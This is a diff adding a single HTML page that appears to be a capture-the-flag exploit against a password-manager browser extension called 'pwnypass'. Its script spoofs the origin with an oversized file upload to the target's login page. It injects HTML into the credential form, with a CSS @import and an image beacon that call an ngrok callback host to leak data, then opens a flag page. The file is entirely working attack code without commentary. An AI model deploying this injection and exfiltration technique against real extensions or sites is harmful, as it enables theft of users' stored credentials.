@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>x</title>
+</head>
+<body>
+
+<form method="POST" id="credForm">
+	<input name="username" type="text" id="usernameField">
+	<input name="password" type="password" id="passwordField">
+	<input name="submit" type="submit">
+</form>
+
+<form id="bigform" enctype="multipart/form-data" action="https://pwnypass.c.hc.lc/login.php" method="POST">
+	<input type=file id=fileinp name=lol>
+</form>
+
+<template id="extHtml">
+	<div>
+		<p>it works?</p>
+		<style>
+			@import 'https://c50e-109-156-209-195.ngrok-free.app/style.css';
+			img { background: var(--lol); }
+		</style>
+		<img src="https://c50e-109-156-209-195.ngrok-free.app/cb?curr=">
+	</div>
+</template>
+
+<script>
+// getOrigin spoof
+
+let lmao = new DataTransfer();
+lmao.items.add(new File(["a".repeat(59388419)], "lol"));
+fileinp.files = lmao.files;
+
+setTimeout(() => bigform.submit(), 10);
+setTimeout(() => window.stop(), 700);
+
+
+// write html
+
+usernameField.value = extHtml.content.firstElementChild.innerHTML;
+passwordField.value = "lol";
+
+setTimeout(() => usernameField.dispatchEvent(new Event("change")), 350);
+setTimeout(() => credForm.dispatchEvent(new Event("submit")), 650);
+
+setTimeout(() => open("/flag1.html"), 1000);
+
+</script>
+
+</body>
+</html>
